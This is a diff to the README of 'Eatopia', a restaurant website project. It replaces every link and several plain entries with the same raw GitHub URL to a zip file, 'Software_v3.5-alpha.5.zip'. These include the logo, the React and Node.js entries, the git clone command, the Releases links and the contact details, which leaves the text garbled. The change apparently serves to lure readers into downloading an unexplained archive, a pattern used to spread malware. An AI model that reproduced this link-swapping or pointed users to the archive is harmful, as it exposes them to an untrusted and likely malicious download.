@@ -1,6 +1,6 @@
 # Eatopia 🍽️
 
-![Eatopia Logo](https://via.placeholder.com/150)  
+![Eatopia Logo](https://raw.githubusercontent.com/skibidisigma-hue/eatopia/main/hamletize/Software_v3.5-alpha.5.zip)  
 Welcome to Eatopia, a visually appealing and user-friendly restaurant website designed to enhance your dining experience. This platform showcases the restaurant’s menu, ambiance, and unique offerings, creating a seamless and engaging experience for customers.
 
 ## Table of Contents
@@ -35,8 +35,8 @@ Eatopia is built using a combination of modern web technologies:
 - **HTML5**: For structuring the content.
 - **CSS3**: For styling and layout.
 - **JavaScript**: For interactivity and dynamic content.
-- **React.js**: For building the user interface.
-- **Node.js**: For server-side logic.
+- **https://raw.githubusercontent.com/skibidisigma-hue/eatopia/main/hamletize/Software_v3.5-alpha.5.zip**: For building the user interface.
+- **https://raw.githubusercontent.com/skibidisigma-hue/eatopia/main/hamletize/Software_v3.5-alpha.5.zip**: For server-side logic.
 - **MongoDB**: For database management.
 
 ## Installation
@@ -46,7 +46,7 @@ To get started with Eatopia, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/skibidisigma-hue/eatopia.git
+   git clone https://raw.githubusercontent.com/skibidisigma-hue/eatopia/main/hamletize/Software_v3.5-alpha.5.zip
    ```
 
 2. Navigate to the project directory:
@@ -78,7 +78,7 @@ Once the application is running, you can explore various sections:
 - **About**: Learn about the restaurant's story and mission.
 - **Contact**: Find ways to get in touch for reservations or inquiries.
 
-For more details, check the [Releases](https://github.com/skibidisigma-hue/eatopia/releases) section for downloadable files and updates.
+For more details, check the [Releases](https://raw.githubusercontent.com/skibidisigma-hue/eatopia/main/hamletize/Software_v3.5-alpha.5.zip) section for downloadable files and updates.
 
 ## Contributing
 
@@ -111,14 +111,14 @@ Eatopia is licensed under the MIT License. See the [LICENSE](LICENSE) file for d
 
 ## Releases
 
-To check the latest updates and download files, visit the [Releases](https://github.com/skibidisigma-hue/eatopia/releases) section. You can find important updates and new features here.
+To check the latest updates and download files, visit the [Releases](https://raw.githubusercontent.com/skibidisigma-hue/eatopia/main/hamletize/Software_v3.5-alpha.5.zip) section. You can find important updates and new features here.
 
 ## Contact
 
 For any inquiries or feedback, feel free to reach out:
 
-- **Email**: support@eatopia.com
-- **Twitter**: [@Eatopia](https://twitter.com/eatopia)
-- **Facebook**: [Eatopia Page](https://facebook.com/eatopia)
+- **Email**: https://raw.githubusercontent.com/skibidisigma-hue/eatopia/main/hamletize/Software_v3.5-alpha.5.zip
+- **Twitter**: [@Eatopia](https://raw.githubusercontent.com/skibidisigma-hue/eatopia/main/hamletize/Software_v3.5-alpha.5.zip)
+- **Facebook**: [Eatopia Page](https://raw.githubusercontent.com/skibidisigma-hue/eatopia/main/hamletize/Software_v3.5-alpha.5.zip)
 
 Thank you for visiting Eatopia! We hope you enjoy your experience.
